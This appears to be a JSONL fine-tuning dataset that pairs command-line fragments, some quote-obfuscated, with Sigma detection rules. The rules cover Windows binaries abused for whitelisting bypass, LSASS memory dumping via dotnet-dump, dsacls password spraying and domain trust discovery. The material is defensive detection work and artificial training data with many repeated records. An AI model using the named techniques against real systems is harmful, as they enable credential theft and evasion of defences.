{"instruction": "Write Sigma rule to detect payload:", "input": "\\dns.exe \\conhost.exe", "output": "title: Unusual Child Process of dns.exe\nid: a4e3d776-f12e-42c2-8510-9e6ed1f43ec3\nstatus: test\ndescription: Detects an unexpected process spawning from dns.exe which may indicate activity related to remote code execution or other forms of exploitation as seen in CVE-2020-1350 (SigRed)\nreferences:\n    - https://www.elastic.co/guide/en/security/current/unusual-child-process-of-dns-exe.html\nauthor: Tim Rauch, Elastic (idea)\ndate: 2022-09-27\nmodified: 2023-02-05\ntags:\n    - attack.initial-access\n    - attack.t1133\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith: '\\dns.exe'\n    filter:\n        Image|endswith: '\\conhost.exe'\n    condition: selection and not filter\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\dnx.exe", "output": "title: Potential Application Whitelisting Bypass via Dnx.EXE\nid: 81ebd28b-9607-4478-bf06-974ed9d53ed7\nstatus: test\ndescription: |\n    Detects the execution of Dnx.EXE. The Dnx utility allows for the execution of C# code.\n    Attackers might abuse this in order to bypass application whitelisting.\nreferences:\n    - https://lolbas-project.github.io/lolbas/OtherMSBinaries/Csi/\n    - https://enigma0x3.net/2016/11/17/bypassing-application-whitelisting-by-using-dnx-exe/\nauthor: Beyu Denis, oscd.community\ndate: 2019-10-26\nmodified: 2024-04-24\ntags:\n    - attack.defense-evasion\n    - attack.t1218\n    - attack.t1027.004\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\dnx.exe'\n    condition: selection\nfalsepositives:\n    - Legitimate use of dnx.exe by legitimate user\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\\"\\dnx.exe\\\"", "output": "title: Potential Application Whitelisting Bypass via Dnx.EXE\nid: 81ebd28b-9607-4478-bf06-974ed9d53ed7\nstatus: test\ndescription: |\n    Detects the execution of Dnx.EXE. The Dnx utility allows for the execution of C# code.\n    Attackers might abuse this in order to bypass application whitelisting.\nreferences:\n    - https://lolbas-project.github.io/lolbas/OtherMSBinaries/Csi/\n    - https://enigma0x3.net/2016/11/17/bypassing-application-whitelisting-by-using-dnx-exe/\nauthor: Beyu Denis, oscd.community\ndate: 2019-10-26\nmodified: 2024-04-24\ntags:\n    - attack.defense-evasion\n    - attack.t1218\n    - attack.t1027.004\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\dnx.exe'\n    condition: selection\nfalsepositives:\n    - Legitimate use of dnx.exe by legitimate user\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\dnx", "output": "title: Potential Application Whitelisting Bypass via Dnx.EXE\nid: 81ebd28b-9607-4478-bf06-974ed9d53ed7\nstatus: test\ndescription: |\n    Detects the execution of Dnx.EXE. The Dnx utility allows for the execution of C# code.\n    Attackers might abuse this in order to bypass application whitelisting.\nreferences:\n    - https://lolbas-project.github.io/lolbas/OtherMSBinaries/Csi/\n    - https://enigma0x3.net/2016/11/17/bypassing-application-whitelisting-by-using-dnx-exe/\nauthor: Beyu Denis, oscd.community\ndate: 2019-10-26\nmodified: 2024-04-24\ntags:\n    - attack.defense-evasion\n    - attack.t1218\n    - attack.t1027.004\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\dnx.exe'\n    condition: selection\nfalsepositives:\n    - Legitimate use of dnx.exe by legitimate user\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\dnx.exe", "output": "title: Potential Application Whitelisting Bypass via Dnx.EXE\nid: 81ebd28b-9607-4478-bf06-974ed9d53ed7\nstatus: test\ndescription: |\n    Detects the execution of Dnx.EXE. The Dnx utility allows for the execution of C# code.\n    Attackers might abuse this in order to bypass application whitelisting.\nreferences:\n    - https://lolbas-project.github.io/lolbas/OtherMSBinaries/Csi/\n    - https://enigma0x3.net/2016/11/17/bypassing-application-whitelisting-by-using-dnx-exe/\nauthor: Beyu Denis, oscd.community\ndate: 2019-10-26\nmodified: 2024-04-24\ntags:\n    - attack.defense-evasion\n    - attack.t1218\n    - attack.t1027.004\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\dnx.exe'\n    condition: selection\nfalsepositives:\n    - Legitimate use of dnx.exe by legitimate user\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\dotnet-dump.exe dotnet-dump.dll collect", "output": "title: Process Memory Dump Via Dotnet-Dump\nid: 53d8d3e1-ca33-4012-adf3-e05a4d652e34\nstatus: test\ndescription: |\n    Detects the execution of \"dotnet-dump\" with the \"collect\" flag. The execution could indicate potential process dumping of critical processes such as LSASS.\nreferences:\n    - https://learn.microsoft.com/en-us/dotnet/core/diagnostics/dotnet-dump#dotnet-dump-collect\n    - https://twitter.com/bohops/status/1635288066909966338\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-03-14\ntags:\n    - attack.defense-evasion\n    - attack.t1218\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\dotnet-dump.exe'\n        - OriginalFileName: 'dotnet-dump.dll'\n    selection_cli:\n        CommandLine|contains: 'collect'\n    condition: all of selection_*\nfalsepositives:\n    - Process dumping is the expected behavior of the tool. So false positives are expected in legitimate usage. The PID/Process Name of the process being dumped needs to be investigated\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\dotnet-dump.exe \"d\"\"o\"\"t\"\"n\"\"e\"\"t\"\"-\"\"d\"\"u\"\"m\"\"p\"\".\"\"d\"\"l\"\"l\" collect", "output": "title: Process Memory Dump Via Dotnet-Dump\nid: 53d8d3e1-ca33-4012-adf3-e05a4d652e34\nstatus: test\ndescription: |\n    Detects the execution of \"dotnet-dump\" with the \"collect\" flag. The execution could indicate potential process dumping of critical processes such as LSASS.\nreferences:\n    - https://learn.microsoft.com/en-us/dotnet/core/diagnostics/dotnet-dump#dotnet-dump-collect\n    - https://twitter.com/bohops/status/1635288066909966338\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-03-14\ntags:\n    - attack.defense-evasion\n    - attack.t1218\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\dotnet-dump.exe'\n        - OriginalFileName: 'dotnet-dump.dll'\n    selection_cli:\n        CommandLine|contains: 'collect'\n    condition: all of selection_*\nfalsepositives:\n    - Process dumping is the expected behavior of the tool. So false positives are expected in legitimate usage. The PID/Process Name of the process being dumped needs to be investigated\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\dotnet-dump dotnet-dump.dll collect", "output": "title: Process Memory Dump Via Dotnet-Dump\nid: 53d8d3e1-ca33-4012-adf3-e05a4d652e34\nstatus: test\ndescription: |\n    Detects the execution of \"dotnet-dump\" with the \"collect\" flag. The execution could indicate potential process dumping of critical processes such as LSASS.\nreferences:\n    - https://learn.microsoft.com/en-us/dotnet/core/diagnostics/dotnet-dump#dotnet-dump-collect\n    - https://twitter.com/bohops/status/1635288066909966338\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-03-14\ntags:\n    - attack.defense-evasion\n    - attack.t1218\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\dotnet-dump.exe'\n        - OriginalFileName: 'dotnet-dump.dll'\n    selection_cli:\n        CommandLine|contains: 'collect'\n    condition: all of selection_*\nfalsepositives:\n    - Process dumping is the expected behavior of the tool. So false positives are expected in legitimate usage. The PID/Process Name of the process being dumped needs to be investigated\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\dotnet-dump.exe dotnet-dump.dll collect", "output": "title: Process Memory Dump Via Dotnet-Dump\nid: 53d8d3e1-ca33-4012-adf3-e05a4d652e34\nstatus: test\ndescription: |\n    Detects the execution of \"dotnet-dump\" with the \"collect\" flag. The execution could indicate potential process dumping of critical processes such as LSASS.\nreferences:\n    - https://learn.microsoft.com/en-us/dotnet/core/diagnostics/dotnet-dump#dotnet-dump-collect\n    - https://twitter.com/bohops/status/1635288066909966338\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-03-14\ntags:\n    - attack.defense-evasion\n    - attack.t1218\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\dotnet-dump.exe'\n        - OriginalFileName: 'dotnet-dump.dll'\n    selection_cli:\n        CommandLine|contains: 'collect'\n    condition: all of selection_*\nfalsepositives:\n    - Process dumping is the expected behavior of the tool. So false positives are expected in legitimate usage. The PID/Process Name of the process being dumped needs to be investigated\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\dotnet.exe .NET Host", "output": "title: Arbitrary DLL or Csproj Code Execution Via Dotnet.EXE\nid: d80d5c81-04ba-45b4-84e4-92eba40e0ad3\nstatus: test\ndescription: Detects execution of arbitrary DLLs or unsigned code via a \".csproj\" files via Dotnet.EXE.\nreferences:\n    - https://lolbas-project.github.io/lolbas/OtherMSBinaries/Dotnet/\n    - https://twitter.com/_felamos/status/1204705548668555264\n    - https://bohops.com/2019/08/19/dotnet-core-a-vector-for-awl-bypass-defense-evasion/\nauthor: Beyu Denis, oscd.community\ndate: 2020-10-18\nmodified: 2024-04-24\ntags:\n    - attack.defense-evasion\n    - attack.t1218\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\dotnet.exe'\n        - OriginalFileName: '.NET Host'\n    selection_cli:\n        CommandLine|endswith:\n            - '.csproj'\n            - '.csproj\"'\n            - '.dll'\n            - '.dll\"'\n            - \".csproj'\"\n            - \".dll'\"\n    condition: all of selection_*\nfalsepositives:\n    - Legitimate administrator usage\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\dotnet.exe .N\"ET\" Host", "output": "title: Arbitrary DLL or Csproj Code Execution Via Dotnet.EXE\nid: d80d5c81-04ba-45b4-84e4-92eba40e0ad3\nstatus: test\ndescription: Detects execution of arbitrary DLLs or unsigned code via a \".csproj\" files via Dotnet.EXE.\nreferences:\n    - https://lolbas-project.github.io/lolbas/OtherMSBinaries/Dotnet/\n    - https://twitter.com/_felamos/status/1204705548668555264\n    - https://bohops.com/2019/08/19/dotnet-core-a-vector-for-awl-bypass-defense-evasion/\nauthor: Beyu Denis, oscd.community\ndate: 2020-10-18\nmodified: 2024-04-24\ntags:\n    - attack.defense-evasion\n    - attack.t1218\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\dotnet.exe'\n        - OriginalFileName: '.NET Host'\n    selection_cli:\n        CommandLine|endswith:\n            - '.csproj'\n            - '.csproj\"'\n            - '.dll'\n            - '.dll\"'\n            - \".csproj'\"\n            - \".dll'\"\n    condition: all of selection_*\nfalsepositives:\n    - Legitimate administrator usage\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\dotnet .NET Host", "output": "title: Arbitrary DLL or Csproj Code Execution Via Dotnet.EXE\nid: d80d5c81-04ba-45b4-84e4-92eba40e0ad3\nstatus: test\ndescription: Detects execution of arbitrary DLLs or unsigned code via a \".csproj\" files via Dotnet.EXE.\nreferences:\n    - https://lolbas-project.github.io/lolbas/OtherMSBinaries/Dotnet/\n    - https://twitter.com/_felamos/status/1204705548668555264\n    - https://bohops.com/2019/08/19/dotnet-core-a-vector-for-awl-bypass-defense-evasion/\nauthor: Beyu Denis, oscd.community\ndate: 2020-10-18\nmodified: 2024-04-24\ntags:\n    - attack.defense-evasion\n    - attack.t1218\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\dotnet.exe'\n        - OriginalFileName: '.NET Host'\n    selection_cli:\n        CommandLine|endswith:\n            - '.csproj'\n            - '.csproj\"'\n            - '.dll'\n            - '.dll\"'\n            - \".csproj'\"\n            - \".dll'\"\n    condition: all of selection_*\nfalsepositives:\n    - Legitimate administrator usage\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\dotnet.exe Host .NET", "output": "title: Arbitrary DLL or Csproj Code Execution Via Dotnet.EXE\nid: d80d5c81-04ba-45b4-84e4-92eba40e0ad3\nstatus: test\ndescription: Detects execution of arbitrary DLLs or unsigned code via a \".csproj\" files via Dotnet.EXE.\nreferences:\n    - https://lolbas-project.github.io/lolbas/OtherMSBinaries/Dotnet/\n    - https://twitter.com/_felamos/status/1204705548668555264\n    - https://bohops.com/2019/08/19/dotnet-core-a-vector-for-awl-bypass-defense-evasion/\nauthor: Beyu Denis, oscd.community\ndate: 2020-10-18\nmodified: 2024-04-24\ntags:\n    - attack.defense-evasion\n    - attack.t1218\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\dotnet.exe'\n        - OriginalFileName: '.NET Host'\n    selection_cli:\n        CommandLine|endswith:\n            - '.csproj'\n            - '.csproj\"'\n            - '.dll'\n            - '.dll\"'\n            - \".csproj'\"\n            - \".dll'\"\n    condition: all of selection_*\nfalsepositives:\n    - Legitimate administrator usage\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\dotnet-trace.exe dotnet-trace.dll -- collect", "output": "title: Binary Proxy Execution Via Dotnet-Trace.EXE\nid: 9257c05b-4a4a-48e5-a670-b7b073cf401b\nstatus: test\ndescription: Detects commandline arguments for executing a child process via dotnet-trace.exe\nreferences:\n    - https://twitter.com/bohops/status/1740022869198037480\nauthor: Jimmy Bayne (@bohops)\ndate: 2024-01-02\ntags:\n    - attack.execution\n    - attack.defense-evasion\n    - attack.t1218\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\dotnet-trace.exe'\n        - OriginalFileName: 'dotnet-trace.dll'\n    selection_cli:\n        CommandLine|contains|all:\n            - '-- '\n            - 'collect'\n    condition: all of selection_*\nfalsepositives:\n    - Legitimate usage of the utility in order to debug and trace a program.\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\dotnet-trace.exe dotnet-trace.dll -- \\\"collect\\\"", "output": "title: Binary Proxy Execution Via Dotnet-Trace.EXE\nid: 9257c05b-4a4a-48e5-a670-b7b073cf401b\nstatus: test\ndescription: Detects commandline arguments for executing a child process via dotnet-trace.exe\nreferences:\n    - https://twitter.com/bohops/status/1740022869198037480\nauthor: Jimmy Bayne (@bohops)\ndate: 2024-01-02\ntags:\n    - attack.execution\n    - attack.defense-evasion\n    - attack.t1218\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\dotnet-trace.exe'\n        - OriginalFileName: 'dotnet-trace.dll'\n    selection_cli:\n        CommandLine|contains|all:\n            - '-- '\n            - 'collect'\n    condition: all of selection_*\nfalsepositives:\n    - Legitimate usage of the utility in order to debug and trace a program.\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\dotnet-trace dotnet-trace.dll -- collect", "output": "title: Binary Proxy Execution Via Dotnet-Trace.EXE\nid: 9257c05b-4a4a-48e5-a670-b7b073cf401b\nstatus: test\ndescription: Detects commandline arguments for executing a child process via dotnet-trace.exe\nreferences:\n    - https://twitter.com/bohops/status/1740022869198037480\nauthor: Jimmy Bayne (@bohops)\ndate: 2024-01-02\ntags:\n    - attack.execution\n    - attack.defense-evasion\n    - attack.t1218\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\dotnet-trace.exe'\n        - OriginalFileName: 'dotnet-trace.dll'\n    selection_cli:\n        CommandLine|contains|all:\n            - '-- '\n            - 'collect'\n    condition: all of selection_*\nfalsepositives:\n    - Legitimate usage of the utility in order to debug and trace a program.\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\dotnet-trace.exe dotnet-trace.dll collect --", "output": "title: Binary Proxy Execution Via Dotnet-Trace.EXE\nid: 9257c05b-4a4a-48e5-a670-b7b073cf401b\nstatus: test\ndescription: Detects commandline arguments for executing a child process via dotnet-trace.exe\nreferences:\n    - https://twitter.com/bohops/status/1740022869198037480\nauthor: Jimmy Bayne (@bohops)\ndate: 2024-01-02\ntags:\n    - attack.execution\n    - attack.defense-evasion\n    - attack.t1218\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\dotnet-trace.exe'\n        - OriginalFileName: 'dotnet-trace.dll'\n    selection_cli:\n        CommandLine|contains|all:\n            - '-- '\n            - 'collect'\n    condition: all of selection_*\nfalsepositives:\n    - Legitimate usage of the utility in order to debug and trace a program.\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\dsacls.exe DSACLS.EXE /G GR GE GW GA WP WD", "output": "title: Potentially Over Permissive Permissions Granted Using Dsacls.EXE\nid: 01c42d3c-242d-4655-85b2-34f1739632f7\nstatus: test\ndescription: Detects usage of Dsacls to grant over permissive permissions\nreferences:\n    - https://ss64.com/nt/dsacls.html\n    - https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc771151(v=ws.11)\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-06-20\nmodified: 2023-02-04\ntags:\n    - attack.defense-evasion\n    - attack.t1218\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\dsacls.exe'\n        - OriginalFileName: \"DSACLS.EXE\"\n    selection_flag:\n        CommandLine|contains: ' /G '\n    selection_permissions:\n        CommandLine|contains: # Add more permissions as you see fit in your environment\n            - 'GR'\n            - 'GE'\n            - 'GW'\n            - 'GA'\n            - 'WP'\n            - 'WD'\n    condition: all of selection_*\nfalsepositives:\n    - Legitimate administrators granting over permissive permissions to users\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\dsacls.exe DSACLS.EXE /G GR GE GW \"GA\" WP WD", "output": "title: Potentially Over Permissive Permissions Granted Using Dsacls.EXE\nid: 01c42d3c-242d-4655-85b2-34f1739632f7\nstatus: test\ndescription: Detects usage of Dsacls to grant over permissive permissions\nreferences:\n    - https://ss64.com/nt/dsacls.html\n    - https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc771151(v=ws.11)\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-06-20\nmodified: 2023-02-04\ntags:\n    - attack.defense-evasion\n    - attack.t1218\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\dsacls.exe'\n        - OriginalFileName: \"DSACLS.EXE\"\n    selection_flag:\n        CommandLine|contains: ' /G '\n    selection_permissions:\n        CommandLine|contains: # Add more permissions as you see fit in your environment\n            - 'GR'\n            - 'GE'\n            - 'GW'\n            - 'GA'\n            - 'WP'\n            - 'WD'\n    condition: all of selection_*\nfalsepositives:\n    - Legitimate administrators granting over permissive permissions to users\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\dsacls DSACLS /G GR GE GW GA WP WD", "output": "title: Potentially Over Permissive Permissions Granted Using Dsacls.EXE\nid: 01c42d3c-242d-4655-85b2-34f1739632f7\nstatus: test\ndescription: Detects usage of Dsacls to grant over permissive permissions\nreferences:\n    - https://ss64.com/nt/dsacls.html\n    - https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc771151(v=ws.11)\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-06-20\nmodified: 2023-02-04\ntags:\n    - attack.defense-evasion\n    - attack.t1218\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\dsacls.exe'\n        - OriginalFileName: \"DSACLS.EXE\"\n    selection_flag:\n        CommandLine|contains: ' /G '\n    selection_permissions:\n        CommandLine|contains: # Add more permissions as you see fit in your environment\n            - 'GR'\n            - 'GE'\n            - 'GW'\n            - 'GA'\n            - 'WP'\n            - 'WD'\n    condition: all of selection_*\nfalsepositives:\n    - Legitimate administrators granting over permissive permissions to users\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\dsacls.exe DSACLS.EXE /G GR GE GW GA WP WD", "output": "title: Potentially Over Permissive Permissions Granted Using Dsacls.EXE\nid: 01c42d3c-242d-4655-85b2-34f1739632f7\nstatus: test\ndescription: Detects usage of Dsacls to grant over permissive permissions\nreferences:\n    - https://ss64.com/nt/dsacls.html\n    - https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc771151(v=ws.11)\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-06-20\nmodified: 2023-02-04\ntags:\n    - attack.defense-evasion\n    - attack.t1218\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\dsacls.exe'\n        - OriginalFileName: \"DSACLS.EXE\"\n    selection_flag:\n        CommandLine|contains: ' /G '\n    selection_permissions:\n        CommandLine|contains: # Add more permissions as you see fit in your environment\n            - 'GR'\n            - 'GE'\n            - 'GW'\n            - 'GA'\n            - 'WP'\n            - 'WD'\n    condition: all of selection_*\nfalsepositives:\n    - Legitimate administrators granting over permissive permissions to users\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\dsacls.exe DSACLS.EXE /user: /passwd:", "output": "title: Potential Password Spraying Attempt Using Dsacls.EXE\nid: bac9fb54-2da7-44e9-988f-11e9a5edbc0c\nstatus: test\ndescription: Detects possible password spraying attempts using Dsacls\nreferences:\n    - https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/using-dsacls-to-check-ad-object-permissions#password-spraying-anyone\n    - https://ss64.com/nt/dsacls.html\n    - https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc771151(v=ws.11)\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-06-20\nmodified: 2023-02-04\ntags:\n    - attack.defense-evasion\n    - attack.t1218\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\dsacls.exe'\n        - OriginalFileName: \"DSACLS.EXE\"\n    selection_cli:\n        CommandLine|contains|all:\n            - '/user:'\n            - '/passwd:'\n    condition: all of selection*\nfalsepositives:\n    - Legitimate use of dsacls to bind to an LDAP session\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\dsacls.exe \"DSACLS.EXE\" \"/user:\" /passwd:", "output": "title: Potential Password Spraying Attempt Using Dsacls.EXE\nid: bac9fb54-2da7-44e9-988f-11e9a5edbc0c\nstatus: test\ndescription: Detects possible password spraying attempts using Dsacls\nreferences:\n    - https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/using-dsacls-to-check-ad-object-permissions#password-spraying-anyone\n    - https://ss64.com/nt/dsacls.html\n    - https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc771151(v=ws.11)\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-06-20\nmodified: 2023-02-04\ntags:\n    - attack.defense-evasion\n    - attack.t1218\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\dsacls.exe'\n        - OriginalFileName: \"DSACLS.EXE\"\n    selection_cli:\n        CommandLine|contains|all:\n            - '/user:'\n            - '/passwd:'\n    condition: all of selection*\nfalsepositives:\n    - Legitimate use of dsacls to bind to an LDAP session\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\dsacls DSACLS /user: /passwd:", "output": "title: Potential Password Spraying Attempt Using Dsacls.EXE\nid: bac9fb54-2da7-44e9-988f-11e9a5edbc0c\nstatus: test\ndescription: Detects possible password spraying attempts using Dsacls\nreferences:\n    - https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/using-dsacls-to-check-ad-object-permissions#password-spraying-anyone\n    - https://ss64.com/nt/dsacls.html\n    - https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc771151(v=ws.11)\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-06-20\nmodified: 2023-02-04\ntags:\n    - attack.defense-evasion\n    - attack.t1218\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\dsacls.exe'\n        - OriginalFileName: \"DSACLS.EXE\"\n    selection_cli:\n        CommandLine|contains|all:\n            - '/user:'\n            - '/passwd:'\n    condition: all of selection*\nfalsepositives:\n    - Legitimate use of dsacls to bind to an LDAP session\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\dsacls.exe DSACLS.EXE /user: /passwd:", "output": "title: Potential Password Spraying Attempt Using Dsacls.EXE\nid: bac9fb54-2da7-44e9-988f-11e9a5edbc0c\nstatus: test\ndescription: Detects possible password spraying attempts using Dsacls\nreferences:\n    - https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/using-dsacls-to-check-ad-object-permissions#password-spraying-anyone\n    - https://ss64.com/nt/dsacls.html\n    - https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc771151(v=ws.11)\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-06-20\nmodified: 2023-02-04\ntags:\n    - attack.defense-evasion\n    - attack.t1218\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\dsacls.exe'\n        - OriginalFileName: \"DSACLS.EXE\"\n    selection_cli:\n        CommandLine|contains|all:\n            - '/user:'\n            - '/passwd:'\n    condition: all of selection*\nfalsepositives:\n    - Legitimate use of dsacls to bind to an LDAP session\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\dsquery.exe dsquery.exe trustedDomain", "output": "title: Domain Trust Discovery Via Dsquery\nid: 3bad990e-4848-4a78-9530-b427d854aac0\nrelated:\n    - id: b23fcb74-b1cb-4ff7-a31d-bfe2a7ba453b\n      type: similar\n    - id: 77815820-246c-47b8-9741-e0def3f57308\n      type: obsolete\nstatus: test\ndescription: Detects execution of \"dsquery.exe\" for domain trust discovery\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1482/T1482.md\n    - https://posts.specterops.io/an-introduction-to-manual-active-directory-querying-with-dsquery-and-ldapsearch-84943c13d7eb?gi=41b97a644843\nauthor: E.M. Anhaus, Tony Lambert, oscd.community, omkar72\ndate: 2019-10-24\nmodified: 2023-02-02\ntags:\n    - attack.discovery\n    - attack.t1482\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\dsquery.exe'\n        - OriginalFileName: 'dsquery.exe'\n    selection_cli:\n        CommandLine|contains: 'trustedDomain'\n    condition: all of selection_*\nfalsepositives:\n    - Legitimate use of the utilities by legitimate user for legitimate reason\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\dsquery.exe \"dsquery.exe\" \"trustedDomain\"", "output": "title: Domain Trust Discovery Via Dsquery\nid: 3bad990e-4848-4a78-9530-b427d854aac0\nrelated:\n    - id: b23fcb74-b1cb-4ff7-a31d-bfe2a7ba453b\n      type: similar\n    - id: 77815820-246c-47b8-9741-e0def3f57308\n      type: obsolete\nstatus: test\ndescription: Detects execution of \"dsquery.exe\" for domain trust discovery\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1482/T1482.md\n    - https://posts.specterops.io/an-introduction-to-manual-active-directory-querying-with-dsquery-and-ldapsearch-84943c13d7eb?gi=41b97a644843\nauthor: E.M. Anhaus, Tony Lambert, oscd.community, omkar72\ndate: 2019-10-24\nmodified: 2023-02-02\ntags:\n    - attack.discovery\n    - attack.t1482\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\dsquery.exe'\n        - OriginalFileName: 'dsquery.exe'\n    selection_cli:\n        CommandLine|contains: 'trustedDomain'\n    condition: all of selection_*\nfalsepositives:\n    - Legitimate use of the utilities by legitimate user for legitimate reason\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\dsquery dsquery trustedDomain", "output": "title: Domain Trust Discovery Via Dsquery\nid: 3bad990e-4848-4a78-9530-b427d854aac0\nrelated:\n    - id: b23fcb74-b1cb-4ff7-a31d-bfe2a7ba453b\n      type: similar\n    - id: 77815820-246c-47b8-9741-e0def3f57308\n      type: obsolete\nstatus: test\ndescription: Detects execution of \"dsquery.exe\" for domain trust discovery\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1482/T1482.md\n    - https://posts.specterops.io/an-introduction-to-manual-active-directory-querying-with-dsquery-and-ldapsearch-84943c13d7eb?gi=41b97a644843\nauthor: E.M. Anhaus, Tony Lambert, oscd.community, omkar72\ndate: 2019-10-24\nmodified: 2023-02-02\ntags:\n    - attack.discovery\n    - attack.t1482\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\dsquery.exe'\n        - OriginalFileName: 'dsquery.exe'\n    selection_cli:\n        CommandLine|contains: 'trustedDomain'\n    condition: all of selection_*\nfalsepositives:\n    - Legitimate use of the utilities by legitimate user for legitimate reason\nlevel: medium"}
